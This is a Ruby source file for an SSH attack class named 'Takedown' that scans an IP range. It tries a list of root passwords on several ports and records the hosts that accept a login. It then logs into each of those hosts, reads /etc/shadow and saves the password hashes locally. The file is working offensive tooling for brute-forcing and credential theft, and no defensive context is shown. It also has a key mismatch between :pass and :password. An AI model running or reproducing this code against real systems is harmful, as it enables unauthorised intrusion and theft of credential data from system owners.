require 'ipaddr'

module Codesake
  module SSH
    class Takedown

      attr_reader :ports
      attr_reader :passwds
      attr_reader :target
      attr_reader :results

      def initialize(target)
        @ports = Codesake::SSH::Config.ports
        @passwds = Codesake::SSH::Config.passwords
        @target = target
        @target = IPAddr.new(target) unless target.class == IPAddr.class
      end

      def analyse
        @results = []
        @target.to_range.each do |host|
          @passwds.each do |pass|
            @ports.each do |port|
              @results << {:host=>host.to_s, :port=>port, :pass=>pass} if connect(host.to_s, port, pass)
            end
          end
        end  
        @results
      end

      def takedown
        @results.each do |result|
          steal(result[:host], result[:port], result[:password])
        end
      end

      def compromised?
        ! @results.empty?
      end
      
      def count_compromised
        @results.size
      end
      private 

      def steal(host, port, password)
       begin
          ssh = Net::SSH.start(host, "root", {:password=>password, :port=>port, :timeout=>3})
          data = ssh.exec!("cat /etc/shadow")
          f_d = File.new(host+"_shadow", "w") 
          f_d.write(data)
          f_d.close
          ssh.close
          ret = true
        rescue => e
          ret = false
        end
        ret
      end

      def connect(host, port, password) 
        begin
          ssh = Net::SSH.start(host, "root", {:password=>password, :port=>port, :timeout=>3})
          ssh.close
          ret = true
        rescue => e
          ret = false
        end

      end 


    end
  end
end
